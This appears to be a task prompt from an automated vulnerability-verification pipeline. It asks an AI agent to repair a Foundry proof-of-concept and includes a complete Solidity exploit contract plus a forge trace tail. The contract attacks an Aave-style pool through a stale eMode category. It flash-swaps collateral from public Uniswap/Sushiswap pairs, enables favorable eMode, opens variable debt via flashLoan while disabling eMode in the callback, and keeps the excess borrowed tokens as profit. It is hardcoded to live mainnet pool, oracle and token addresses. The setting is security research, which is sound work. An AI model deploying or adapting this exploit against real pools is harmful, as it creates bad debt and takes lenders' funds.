You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Flash-loan debt opening reuses a stale eMode category after the callback
- claim: `Pool.flashLoan` snapshots `_usersEModeCategory[onBehalfOf]` into `flashParams.userEModeCategory` before the receiver callback runs. During `executeOperation`, a receiver that is also `onBehalfOf` can call `setUserEMode` to disable or downgrade its own eMode. After the callback, `FlashLoanLogic.executeFlashLoan` still passes the stale pre-callback category into `BorrowLogic.executeBorrow`, and `ValidationLogic.validateBorrow` / `GenericLogic.calculateUserAccountData` reuse that stale category for the final collateral and health-factor checks.
- impact: A borrower can open debt at the end of a flash loan using obsolete, more favorable eMode parameters after having already switched to a less favorable or disabled mode. This can finalize positions that would fail the normal post-change health-factor validation, creating immediately undercollateralized debt and potential bad debt.
- exploit_paths: ["Attacker-controlled contract enables a favorable eMode category for itself.", "The contract calls `flashLoan(..., receiverAddress=self, onBehalfOf=self, interestRateModes[i] != 0)`.", "Inside `executeOperation`, the contract calls `setUserEMode(0)` or switches to a weaker category.", "After the callback, the pool still validates the debt opening with the stale cached `userEModeCategory` and mints debt that should no longer be allowed."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
  function balanceOf(address account) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transfer(address to, uint256 amount) external returns (bool);
}

interface IPriceOracleGetterMinimal {
  function getAssetPrice(address asset) external view returns (uint256);
}

interface IPoolAddressesProviderMinimal {
  function getPool() external view returns (address);
  function getPriceOracle() external view returns (address);
}

interface IPoolMinimal {
  struct ReserveConfigurationMap {
    uint256 data;
  }

  struct ReserveData {
    ReserveConfigurationMap configuration;
    uint128 liquidityIndex;
    uint128 currentLiquidityRate;
    uint128 variableBorrowIndex;
    uint128 currentVariableBorrowRate;
    uint128 currentStableBorrowRate;
    uint40 lastUpdateTimestamp;
    uint16 id;
    address aTokenAddress;
    address stableDebtTokenAddress;
    address variableDebtTokenAddress;
    address interestRateStrategyAddress;
    uint128 accruedToTreasury;
    uint128 unbacked;
    uint128 isolationModeTotalDebt;
  }

  struct EModeCategory {
    uint16 ltv;
    uint16 liquidationThreshold;
    uint16 liquidationBonus;
    address priceSource;
    string label;
  }

  function ADDRESSES_PROVIDER() external view returns (IPoolAddressesProviderMinimal);
  function getReservesList() external view returns (address[] memory);
  function getConfiguration(address asset) external view returns (ReserveConfigurationMap memory);
  function getReserveData(address asset) external view returns (ReserveData memory);
  function getEModeCategoryData(uint8 id) external view returns (EModeCategory memory);
  function getUserEMode(address user) external view returns (uint256);
  function getUserAccountData(
    address user
  )
    external
    view
    returns (
      uint256 totalCollateralBase,
      uint256 totalDebtBase,
      uint256 availableBorrowsBase,
      uint256 currentLiquidationThreshold,
      uint256 ltv,
      uint256 healthFactor
    );

  function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
  function setUserEMode(uint8 categoryId) external;
  function flashLoan(
    address receiverAddress,
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata interestRateModes,
    address onBehalfOf,
    bytes calldata params,
    uint16 referralCode
  ) external;
}

interface IFlashLoanReceiverMinimal {
  function executeOperation(
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata premiums,
    address initiator,
    bytes calldata params
  ) external returns (bool);

  function ADDRESSES_PROVIDER() external view returns (IPoolAddressesProviderMinimal);
  function POOL() external view returns (IPoolMinimal);
}

interface IUniswapV2FactoryMinimal {
  function getPair(address tokenA, address tokenB) external view returns (address);
}

interface IUniswapV2PairMinimal {
  function token0() external view returns (address);
  function token1() external view returns (address);
  function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);
  function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier is IFlashLoanReceiverMinimal {
  uint256 private constant VARIABLE_RATE_MODE = 2;
  uint256 private constant BPS = 10_000;
  uint256 private constant MIN_PROFIT = 1e15;

  uint256 private constant LTV_MASK =
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0000;
  uint256 private constant DECIMALS_MASK =
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00FFFFFFFFFFFF;
  uint256 private constant ACTIVE_MASK =
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFFFFFFFF;
  uint256 private constant BORROWING_MASK =
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFBFFFFFFFFFFFFFF;
  uint256 private constant PAUSED_MASK =
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFFFFFFFFF;
  uint256 private constant EMODE_CATEGORY_MASK =
    0xFFFFFFFFFFFFFFFFFFFF00FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;
  uint256 private constant DEBT_CEILING_MASK =
    0xF0000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;

  address private constant TARGET_POOL_IMPLEMENTATION =
    0xfD11AbA71c06061F446ADe4eec057179F19C23C4;
  address private constant UNISWAP_V2_FACTORY =
    0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
  address private constant SUSHISWAP_FACTORY =
    0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
  address private constant WETH =
    0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
  address private constant USDC =
    0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
  address private constant USDT =
    0xdAC17F958D2ee523a2206206994597C13D831ec7;
  address private constant DAI =
    0x6B175474E89094C44Da98b954EedeAC495271d0F;

  struct AssetConfig {
    uint256 raw;
    uint256 ltv;
    uint256 decimals;
    uint256 eModeCategory;
    uint256 debtCeiling;
    bool active;
    bool borrowingEnabled;
    bool paused;
  }

  struct Route {
    bool found;
    bool directRepayment;
    address fundingPair;
    address unwindPair;
    address collateralAsset;
    address borrowAsset;
    address bridgeAsset;
    uint256 flashCollateralAmount;
    uint256 bridgeRepayAmount;
    uint256 borrowToBridgeAmount;
    uint256 projectedProfit;
    uint8 category;
  }

  struct SearchParams {
    address collateralAsset;
    address borrowAsset;
    address bridgeAsset;
    uint8 category;
    uint256 emodeTokenMax;
  }

  IPoolMinimal public immutable override POOL;
  IPoolAddressesProviderMinimal public immutable override ADDRESSES_PROVIDER;

  bool public attempted;
  bool public callbackTriggered;
  bool public hypothesisValidated;
  address public selectedCollateralAsset;
  address public selectedBorrowAsset;
  uint8 public selectedCategory;
  uint256 public selectedCollateralAmount;
  uint256 public selectedBorrowAmount;
  uint256 public selectedBorrowAmountBase;
  uint256 public normalAvailableBorrowsBaseBefore;
  uint256 public emodeAvailableBorrowsBaseBefore;
  uint256 public finalHealthFactor;
  address private _profitToken;
  uint256 private _profitAmount;
  uint256 private _profitBalanceBefore;
  string public lastFailureReason;

  constructor() {
    IPoolAddressesProviderMinimal provider = IPoolMinimal(TARGET_POOL_IMPLEMENTATION)
      .ADDRESSES_PROVIDER();
    address livePool = provider.getPool();
    if (livePool == address(0)) {
      livePool = TARGET_POOL_IMPLEMENTATION;
    }

    ADDRESSES_PROVIDER = provider;
    POOL = IPoolMinimal(livePool);
  }

  function executeOnOpportunity() external {
    if (attempted) {
      return;
    }
    attempted = true;
    lastFailureReason = "";

    address[] memory reserves = POOL.getReservesList();
    if (reserves.length == 0) {
      lastFailureReason = "live pool proxy has no listed reserves";
      return;
    }

    Route memory route = _findBestRoute(reserves);
    if (!route.found) {
      lastFailureReason =
        "no profitable public-liquidity route found for stale-emode debt opening";
      return;
    }

    selectedCollateralAsset = route.collateralAsset;
    selectedBorrowAsset = route.borrowAsset;
    selectedCategory = route.category;
    selectedCollateralAmount = route.flashCollateralAmount;

    _profitToken = route.borrowAsset;
    _profitBalanceBefore = IERC20Minimal(route.borrowAsset).balanceOf(address(this));

    if (!_startFlashswap(route)) {
      _profitToken = address(0);
      _profitBalanceBefore = 0;
      if (bytes(lastFailureReason).length == 0) {
        lastFailureReason = "public-liquidity funding failed under current on-chain conditions";
      }
      return;
    }

    _profitAmount = IERC20Minimal(route.borrowAsset).balanceOf(address(this)) - _profitBalanceBefore;
    (, , , , , finalHealthFactor) = POOL.getUserAccountData(address(this));

    if (
      callbackTriggered &&
      POOL.getUserEMode(address(this)) == 0 &&
      selectedBorrowAmountBase > normalAvailableBorrowsBaseBefore &&
      _profitAmount > 0
    ) {
      hypothesisValidated = true;
    }
  }

  function executeOperation(
    address[] calldata,
    uint256[] calldata,
    uint256[] calldata,
    address initiator,
    bytes calldata params
  ) external override returns (bool) {
    if (msg.sender != address(POOL) || initiator != address(this)) {
      lastFailureReason = "unexpected flashLoan callback caller";
      return false;
    }

    callbackTriggered = true;
    uint8 category = abi.decode(params, (uint8));
    if (category == 0) {
      lastFailureReason = "invalid callback category";
      return false;
    }

    // exploit_paths[2]: while the debt-opening flash loan is still inside the callback, disable the
    // favorable mode before control returns. The protocol later reuses the stale cached category.
    if (!_setUserEMode(0)) {
      lastFailureReason = "failed to disable eMode inside flashLoan callback";
      return false;
    }

    return true;
  }

  function uniswapV2Call(
    address sender,
    uint256 amount0,
    uint256 amount1,
    bytes calldata data
  ) external {
    Route memory route = abi.decode(data, (Route));
    if (msg.sender != route.fundingPair || sender != address(this)) {
      revert();
    }

    IUniswapV2PairMinimal pair = IUniswapV2PairMinimal(route.fundingPair);
    address token0 = pair.token0();
    uint256 collateralReceived = route.collateralAsset == token0 ? amount0 : amount1;
    if (collateralReceived != route.flashCollateralAmount || collateralReceived == 0) {
      revert();
    }

    _executeFlashswapRoute(route, collateralReceived);
  }

  function profitToken() external view returns (address) {
    return _profitToken;
  }

  function profitAmount() external view returns (uint256) {
    return _profitAmount;
  }

  function exploitPaths() external pure returns (string[4] memory paths) {
    paths[0] =
      "Attacker-controlled contract enables a favorable eMode category for itself.";
    paths[1] =
      "The contract calls flashLoan(..., receiverAddress=self, onBehalfOf=self, interestRateModes[i] != 0).";
    paths[2] =
      "Inside executeOperation, the contract calls setUserEMode(0) or switches to a weaker category.";
    paths[3] =
      "After the callback, the pool still validates the debt opening with the stale cached userEModeCategory and mints debt that should no longer be allowed.";
  }

  function exploitPathUsed() external pure returns (string memory) {
    return
      "public v2 flashswap funds collateral -> enable favorable eMode -> flashLoan(receiver=self,onBehalfOf=self,mode=variable) -> setUserEMode(0) in executeOperation -> stale cached eMode used for debt opening -> swap part of borrowed asset through public liquidity only to settle the external funding leg";
  }

  function _executeFlashswapRoute(Route memory route, uint256 collateralReceived) internal {
    uint256 borrowAmount;
    address[] memory assets;
    uint256[] memory amounts;
    uint256[] memory modes;
    bool ok;

    if (!_approveIfNeeded(route.collateralAsset, address(POOL), collateralReceived)) {
      revert();
    }
    POOL.supply(route.collateralAsset, collateralReceived, address(this), 0);

    (, , normalAvailableBorrowsBaseBefore, , , ) = POOL.getUserAccountData(address(this));

    // exploit_paths[0]: the verifier first acquires collateral from public liquidity and supplies it,
    // then enables the favorable eMode category on itself before invoking flashLoan.
    if (!_setUserEMode(route.category)) {
      revert();
    }

    (, , emodeAvailableBorrowsBaseBefore, , , ) = POOL.getUserAccountData(address(this));
    if (emodeAvailableBorrowsBaseBefore <= normalAvailableBorrowsBaseBefore) {
      revert();
    }

    borrowAmount = _chooseBorrowAmount(route.borrowAsset, route.borrowToBridgeAmount);
    if (borrowAmount == 0) {
      revert();
    }

    selectedBorrowAmount = borrowAmount;
    selectedBorrowAmountBase = _toBase(route.borrowAsset, borrowAmount);

    assets = new address[](1);
    assets[0] = route.borrowAsset;
    amounts = new uint256[](1);
    amounts[0] = borrowAmount;
    modes = new uint256[](1);
    modes[0] = VARIABLE_RATE_MODE;

    // exploit_paths[1]: the verifier is both receiverAddress and onBehalfOf, and the non-zero
    // interestRateMode makes the flash loan settle by opening debt instead of requiring repayment.
    (ok, ) = address(POOL).call(
      abi.encodeWithSelector(
        IPoolMinimal.flashLoan.selector,
        address(this),
        assets,
        amounts,
        modes,
        address(this),
        abi.encode(route.category),
        uint16(0)
      )
    );
    if (!ok) {
      revert();
    }

    // exploit_paths[3]: the stale cached category already let the debt mint succeed. Swapping part
    // of that borrowed asset into the funding-leg bridge asset is only a realistic public-liquidity
    // unwind step so the initial flashswap can be repaid atomically.
    if (route.directRepayment) {
      if (!IERC20Minimal(route.borrowAsset).transfer(route.fundingPair, route.bridgeRepayAmount)) {
        revert();
      }
      return;
    }

    _swapBorrowForBridge(route);
    if (!IERC20Minimal(route.bridgeAsset).transfer(route.fundingPair, route.bridgeRepayAmount)) {
      revert();
    }
  }

  function _findBestRoute(address[] memory reserves) internal view returns (Route memory best) {
    uint16[8] memory bpsChoices = [uint16(5), 10, 25, 50, 100, 200, 500, 1000];

    for (uint256 i = 0; i < reserves.length; ++i) {
      address collateralAsset = reserves[i];
      if (collateralAsset == address(0)) {
        continue;
      }

      AssetConfig memory collateralCfg = _readAssetConfig(collateralAsset);
      if (
        collateralCfg.eModeCategory == 0 ||
        collateralCfg.ltv == 0 ||
        !collateralCfg.active ||
        collateralCfg.paused ||
        collateralCfg.debtCeiling != 0
      ) {
        continue;
      }

      IPoolMinimal.EModeCategory memory categoryData = POOL.getEModeCategoryData(
        uint8(collateralCfg.eModeCategory)
      );
      if (categoryData.ltv <= collateralCfg.ltv) {
        continue;
      }

      for (uint256 j = 0; j < reserves.length; ++j) {
        address borrowAsset = reserves[j];
        if (borrowAsset == address(0) || borrowAsset == collateralAsset) {
          continue;
        }

        AssetConfig memory borrowCfg = _readAssetConfig(borrowAsset);
        if (
          borrowCfg.eModeCategory != collateralCfg.eModeCategory ||
          borrowCfg.decimals < 15 ||
          !borrowCfg.borrowingEnabled ||
          !borrowCfg.active ||
          borrowCfg.paused
        ) {
          continue;
        }

        for (uint256 bridgeIndex = 0; bridgeIndex < 4; ++bridgeIndex) {
          address bridgeAsset = _bridgeAssetAt(bridgeIndex);
          if (
            bridgeAsset == address(0) ||
            bridgeAsset == collateralAsset ||
            bridgeAsset == borrowAsset
          ) {
            continue;
          }

          Route memory bridgeRoute = _findBridgeRoute(
            collateralAsset,
            borrowAsset,
            bridgeAsset,
            uint8(collateralCfg.eModeCategory),
            bpsChoices
          );
          if (bridgeRoute.projectedProfit > best.projectedProfit) {
            best = bridgeRoute;
          }
        }

        if (!best.found) {
          Route memory directRoute = _findDirectRoute(
            collateralAsset,
            borrowAsset,
            uint8(collateralCfg.eModeCategory),
            bpsChoices
          );
          if (directRoute.projectedProfit > best.projectedProfit) {
            best = directRoute;
          }
        }
      }
    }
  }

  function _findBridgeRoute(
    address collateralAsset,
    address borrowAsset,
    address bridgeAsset,
    uint8 category,
    uint16[8] memory bpsChoices
  ) internal view returns (Route memory best) {
    SearchParams memory params = SearchParams({
      collateralAsset: collateralAsset,
      borrowAsset: borrowAsset,
      bridgeAsset: bridgeAsset,
      category: category,
      emodeTokenMax: _projectEmodeBorrowCapacity(collateralAsset, borrowAsset, category, 1)
    });

    if (params.emodeTokenMax <= MIN_PROFIT) {
      return best;
    }

    for (uint256 fundingFactoryIndex = 0; fundingFactoryIndex < 2; ++fundingFactoryIndex) {
      address fundingPair = IUniswapV2FactoryMinimal(_factoryAt(fundingFactoryIndex)).getPair(
        params.collateralAsset,
        params.bridgeAsset
      );
      if (fundingPair == address(0)) {
        continue;
      }

      (uint256 reserveCollateral, uint256 reserveBridgeFunding) = _pairReservesFor(
        fundingPair,
        params.collateralAsset,
        params.bridgeAsset
      );
      if (reserveCollateral == 0 || reserveBridgeFunding == 0) {
        continue;
      }

      Route memory candidate = _bestBridgeRouteForFundingPair(
        params,
        fundingPair,
        reserveCollateral,
        reserveBridgeFunding,
        bpsChoices
      );
      if (candidate.projectedProfit > best.projectedProfit) {
        best = candidate;
      }
    }
  }

  function _bestBridgeRouteForFundingPair(
    SearchParams memory params,
    address fundingPair,
    uint256 reserveCollateral,
    uint256 reserveBridgeFunding,
    uint16[8] memory bpsChoices
  ) internal view returns (Route memory best) {
    for (uint256 unwindFactoryIndex = 0; unwindFactoryIndex < 2; ++unwindFactoryIndex) {
      address unwindPair = IUniswapV2FactoryMinimal(_factoryAt(unwindFactoryIndex)).getPair(
        params.borrowAsset,
        params.bridgeAsset
      );
      if (unwindPair == address(0)) {
        continue;
      }

      (uint256 reserveBorrowUnwind, uint256 reserveBridgeUnwind) = _pairReservesFor(
        unwindPair,
        params.borrowAsset,
        params.bridgeAsset
      );
      if (reserveBorrowUnwind == 0 || reserveBridgeUnwind == 0) {
        continue;
      }

      Route memory candidate = _evaluateBridgePairCombination(
        params,
        fundingPair,
        unwindPair,
        reserveCollateral,
        reserveBridgeFunding,
        reserveBorrowUnwind,
        reserveBridgeUnwind,
        bpsChoices
      );
      if (candidate.projectedProfit > best.projectedProfit) {
        best = candidate;
      }
    }
  }

  function _findDirectRoute(
    address collateralAsset,
    address borrowAsset,
    uint8 category,
    uint16[8] memory bpsChoices
  ) internal view returns (Route memory best) {
    uint256 emodeTokenMax;

    emodeTokenMax = _projectEmodeBorrowCapacity(collateralAsset, borrowAsset, category, 1);
    if (emodeTokenMax <= MIN_PROFIT) {
      return best;
    }

    for (uint256 factoryIndex = 0; factoryIndex < 2; ++factoryIndex) {
      address pair = IUniswapV2FactoryMinimal(_factoryAt(factoryIndex)).getPair(
        collateralAsset,
        borrowAsset
      );
      if (pair == address(0)) {
        continue;
      }

      (uint256 reserveCollateral, uint256 reserveBorrow) = _pairReservesFor(
        pair,
        collateralAsset,
        borrowAsset
      );
      if (reserveCollateral == 0 || reserveBorrow == 0) {
        continue;
      }

      Route memory candidate = _evaluateDirectPairCombination(
        pair,
        collateralAsset,
        borrowAsset,
        category,
        reserveCollateral,
        reserveBorrow,
        emodeTokenMax,
        bpsChoices
      );
      if (candidate.projectedProfit > best.projectedProfit) {
        best = candidate;
      }
    }
  }

  function _evaluateBridgePairCombination(
    SearchParams memory params,
    address fundingPair,
    address unwindPair,
    uint256 reserveCollateral,
    uint256 reserveBridgeFunding,
    uint256 reserveBorrowUnwind,
    uint256 reserveBridgeUnwind,
    uint16[8] memory bpsChoices
  ) internal pure returns (Route memory best) {
    for (uint256 k = 0; k < bpsChoices.length; ++k) {
      uint256 flashAmount = (reserveCollateral * bpsChoices[k]) / BPS;
      if (flashAmount == 0 || flashAmount >= reserveCollateral) {
        continue;
      }

      uint256 bridgeRepayAmount = _getAmountIn(flashAmount, reserveBridgeFunding, reserveCollateral);
      if (bridgeRepayAmount == type(uint256).max || bridgeRepayAmount >= reserveBridgeUnwind) {
        continue;
      }

      uint256 borrowToBridgeAmount = _getAmountIn(
        bridgeRepayAmount,
        reserveBorrowUnwind,
        reserveBridgeUnwind
      );
      if (
        borrowToBridgeAmount == type(uint256).max ||
        params.emodeTokenMax <= borrowToBridgeAmount + MIN_PROFIT
      ) {
        continue;
      }

      uint256 projectedProfit = params.emodeTokenMax - borrowToBridgeAmount;
      if (projectedProfit <= best.projectedProfit) {
        continue;
      }

      best = Route({
        found: true,
        directRepayment: false,
        fundingPair: fundingPair,
        unwindPair: unwindPair,
        collateralAsset: params.collateralAsset,
        borrowAsset: params.borrowAsset,
        bridgeAsset: params.bridgeAsset,
        flashCollateralAmount: flashAmount,
        bridgeRepayAmount: bridgeRepayAmount,
        borrowToBridgeAmount: borrowToBridgeAmount,
        projectedProfit: projectedProfit,
        category: params.category
      });
    }
  }

  function _evaluateDirectPairCombination(
    address pair,
    address collateralAsset,
    address borrowAsset,
    uint8 category,
    uint256 reserveCollateral,
    uint256 reserveBorrow,
    uint256 emodeTokenMax,
    uint16[8] memory bpsChoices
  ) internal pure returns (Route memory best) {
    for (uint256 k = 0; k < bpsChoices.length; ++k) {
      uint256 flashAmount = (reserveCollateral * bpsChoices[k]) / BPS;
      if (flashAmount == 0 || flashAmount >= reserveCollateral) {
        continue;
      }

      uint256 borrowRepayAmount = _getAmountIn(flashAmount, reserveBorrow, reserveCollateral);
      if (
        borrowRepayAmount == type(uint256).max ||
        emodeTokenMax <= borrowRepayAmount + MIN_PROFIT
      ) {
        continue;
      }

      uint256 projectedProfit = emodeTokenMax - borrowRepayAmount;
      if (projectedProfit <= best.projectedProfit) {
        continue;
      }

      best = Route({
        found: true,
        directRepayment: true,
        fundingPair: pair,
        unwindPair: address(0),
        collateralAsset: collateralAsset,
        borrowAsset: borrowAsset,
        bridgeAsset: borrowAsset,
        flashCollateralAmount: flashAmount,
        bridgeRepayAmount: borrowRepayAmount,
        borrowToBridgeAmount: borrowRepayAmount,
        projectedProfit: projectedProfit,
        category: category
      });
    }
  }

  function _projectEmodeBorrowCapacity(
    address collateralAsset,
    address borrowAsset,
    uint8 category,
    uint256 flashAmount
  ) internal view returns (uint256) {
    AssetConfig memory collateralCfg = _readAssetConfig(collateralAsset);
    AssetConfig memory borrowCfg = _readAssetConfig(borrowAsset);
    uint256 collateralPrice = _oracle().getAssetPrice(collateralAsset);
    uint256 borrowPrice = _oracle().getAssetPrice(borrowAsset);
    if (collateralPrice == 0 || borrowPrice == 0) {
      return 0;
    }

    uint256 collateralBase = (flashAmount * collateralPrice) / (10 ** collateralCfg.decimals);
    uint256 emodeBase = (collateralBase * POOL.getEModeCategoryData(category).ltv) / BPS;
    uint256 emodeTokenMax = (emodeBase * (10 ** borrowCfg.decimals)) / borrowPrice;
    uint256 reserveLiquidity = IERC20Minimal(borrowAsset).balanceOf(
      POOL.getReserveData(borrowAsset).aTokenAddress
    );
    return emodeTokenMax < reserveLiquidity ? emodeTokenMax : reserveLiquidity;
  }

  function _startFlashswap(Route memory route) internal returns (bool) {
    IUniswapV2PairMinimal pair = IUniswapV2PairMinimal(route.fundingPair);
    address token0 = pair.token0();
    uint256 amount0Out = route.collateralAsset == token0 ? route.flashCollateralAmount : 0;
    uint256 amount1Out = route.collateralAsset == token0 ? 0 : route.flashCollateralAmount;

    (bool ok, ) = route.fundingPair.call(
      abi.encodeWithSelector(
        IUniswapV2PairMinimal.swap.selector,
        amount0Out,
        amount1Out,
        address(this),
        abi.encode(route)
      )
    );
    return ok;
  }

  function _chooseBorrowAmount(
    address borrowAsset,
    uint256 borrowToBridgeAmount
  ) internal view returns (uint256) {
    AssetConfig memory borrowCfg = _readAssetConfig(borrowAsset);
    uint256 price = _oracle().getAssetPrice(borrowAsset);
    if (price == 0) {
      return 0;
    }

    uint256 unit = 10 ** borrowCfg.decimals;
    uint256 normalTokenMax = (normalAvailableBorrowsBaseBefore * unit) / price;
    uint256 emodeTokenMax = (emodeAvailableBorrowsBaseBefore * unit) / price;
    uint256 reserveLiquidity = IERC20Minimal(borrowAsset).balanceOf(
      POOL.getReserveData(borrowAsset).aTokenAddress
    );

    if (emodeTokenMax > reserveLiquidity) {
      emodeTokenMax = reserveLiquidity;
    }

    uint256 minBorrow = normalTokenMax + 1;
    uint256 minProfitableBorrow = borrowToBridgeAmount + MIN_PROFIT + 1;
    if (minBorrow < minProfitableBorrow) {
      minBorrow = minProfitableBorrow;
    }

    if (emodeTokenMax <= minBorrow) {
      return 0;
    }

    uint256 headroom = emodeTokenMax - minBorrow;
    return minBorrow + ((headroom * 19) / 20);
  }

  function _swapBorrowForBridge(Route memory route) internal {
    IUniswapV2PairMinimal pair = IUniswapV2PairMinimal(route.unwindPair);
    address token0 = pair.token0();

    if (!IERC20Minimal(route.borrowAsset).transfer(route.unwindPair, route.borrowToBridgeAmount)) {
      revert();
    }

    uint256 amount0Out = route.bridgeAsset == token0 ? route.bridgeRepayAmount : 0;
    uint256 amount1Out = route.bridgeAsset == token0 ? 0 : route.bridgeRepayAmount;
    pair.swap(amount0Out, amount1Out, address(this), new bytes(0));
  }

  function _pairReservesFor(
    address pair,
    address assetIn,
    address assetOut
  ) internal view returns (uint256 reserveIn, uint256 reserveOut) {
    IUniswapV2PairMinimal v2Pair = IUniswapV2PairMinimal(pair);
    (uint112 reserve0, uint112 reserve1, ) = v2Pair.getReserves();
    address token0 = v2Pair.token0();
    address token1 = v2Pair.token1();

    if (token0 == assetIn && token1 == assetOut) {
      return (uint256(reserve0), uint256(reserve1));
    }
    if (token0 == assetOut && token1 == assetIn) {
      return (uint256(reserve1), uint256(reserve0));
    }
    return (0, 0);
  }

  function _toBase(address asset, uint256 amount) internal view returns (uint256) {
    AssetConfig memory cfg = _readAssetConfig(asset);
    return (amount * _oracle().getAssetPrice(asset)) / (10 ** cfg.decimals);
  }

  function _oracle() internal view returns (IPriceOracleGetterMinimal) {
    return IPriceOracleGetterMinimal(ADDRESSES_PROVIDER.getPriceOracle());
  }

  function _factoryAt(uint256 index) internal pure returns (address) {
    if (index == 0) {
      return UNISWAP_V2_FACTORY;
    }
    if (index == 1) {
      return SUSHISWAP_FACTORY;
    }
    return address(0);
  }

  function _bridgeAssetAt(uint256 index) internal pure returns (address) {
    if (index == 0) {
      return WETH;
    }
    if (index == 1) {
      return USDC;
    }
    if (index == 2) {
      return USDT;
    }
    if (index == 3) {
      return DAI;
    }
    return address(0);
  }

  function _getAmountIn(
    uint256 amountOut,
    uint256 reserveIn,
    uint256 reserveOut
  ) internal pure returns (uint256) {
    if (amountOut == 0 || reserveIn == 0 || reserveOut <= amountOut) {
      return type(uint256).max;
    }

    uint256 numerator = reserveIn * amountOut * 1000;
    uint256 denominator = (reserveOut - amountOut) * 997;
    return (numerator / denominator) + 1;
  }

  function _setUserEMode(uint8 category) internal returns (bool) {
    (bool ok, ) = address(POOL).call(
      abi.encodeWithSelector(IPoolMinimal.setUserEMode.selector, category)
    );
    return ok;
  }

  function _approveIfNeeded(address token, address spender, uint256 amount) internal returns (bool) {
    uint256 current = IERC20Minimal(token).allowance(address(this), spender);
    if (current >= amount) {
      return true;
    }

    if (current != 0 && !_safeApprove(token, spender, 0)) {
      return false;
    }

    return _safeApprove(token, spender, type(uint256).max);
  }

  function _safeApprove(address token, address spender, uint256 amount) internal returns (bool) {
    (bool ok, bytes memory ret) = token.call(
      abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount)
    );
    return ok && (ret.length == 0 || abi.decode(ret, (bool)));
  }

  function _readAssetConfig(address asset) internal view returns (AssetConfig memory cfg) {
    cfg.raw = POOL.getConfiguration(asset).data;
    cfg.ltv = cfg.raw & ~LTV_MASK;
    cfg.decimals = (cfg.raw & ~DECIMALS_MASK) >> 48;
    cfg.active = (cfg.raw & ~ACTIVE_MASK) != 0;
    cfg.borrowingEnabled = (cfg.raw & ~BORROWING_MASK) != 0;
    cfg.paused = (cfg.raw & ~PAUSED_MASK) != 0;
    cfg.eModeCategory = (cfg.raw & ~EMODE_CATEGORY_MASK) >> 168;
    cfg.debtCeiling = (cfg.raw & ~DEBT_CEILING_MASK) >> 212;
  }
}

```

forge stdout (tail):
```
   ├─ [402] 0x3Bbf9f4762508b4DcC3C98B59030D33277949276::getPriceOracle() [staticcall]
    │   │   └─ ← [Return] 0x914a0835dC718D2458A447711DF18E32498B1BC9
    │   ├─ [3187] 0x914a0835dC718D2458A447711DF18E32498B1BC9::getAssetPrice(0x8CC0F052fff7eaD7f2EdCCcaC895502E884a8a71) [staticcall]
    │   │   ├─ [2165] 0x4D9f5C2cB7aBf1a044e6a34167ad4288546F0639::50d25bcd() [staticcall]
    │   │   │   ├─ [825] 0x066A917fA2e1739ccfc306dc73ff78EECa8B6F29::a3c8f5d9() [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000001e0b46d90189368a
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000ce760d2
    │   │   └─ ← [Return] 216490194 [2.164e8]
    │   ├─ [2798] 0x76F0C94Ced5B48020bf0D7f3D0CEabC877744cB5::getEModeCategoryData(1) [staticcall]
    │   │   ├─ [2210] 0xfD11AbA71c06061F446ADe4eec057179F19C23C4::getEModeCategoryData(1) [delegatecall]
    │   │   │   └─ ← [Return] EModeCategory({ ltv: 9700, liquidationThreshold: 9750, liquidationBonus: 10100 [1.01e4], priceSource: 0x0000000000000000000000000000000000000000, label: "Stablecoins" })
    │   │   └─ ← [Return] EModeCategory({ ltv: 9700, liquidationThreshold: 9750, liquidationBonus: 10100 [1.01e4], priceSource: 0x0000000000000000000000000000000000000000, label: "Stablecoins" })
